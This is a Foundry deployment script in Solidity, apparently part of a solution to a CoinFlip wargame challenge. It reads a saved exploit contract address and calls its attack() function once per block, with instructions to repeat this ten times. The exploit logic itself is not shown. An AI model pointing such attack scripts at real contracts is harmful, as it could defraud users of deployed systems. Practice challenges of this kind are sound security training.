// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IExploitCoinFlip} from "./IExploit.sol";

/// @notice Reads the deployed exploit address and fires one attack per invocation.
///         Run this 10 times with `sleep 15` between each call (one attack per block).
contract AttackCoinFlip is Script {
    function run() public {
        // Read the exploit address that was saved by DeployExploit
        string memory addrStr = vm.readFile("address.txt");
        address exploit = vm.parseAddress(addrStr);

        vm.startBroadcast();
        IExploitCoinFlip(exploit).attack();
        vm.stopBroadcast();
    }
}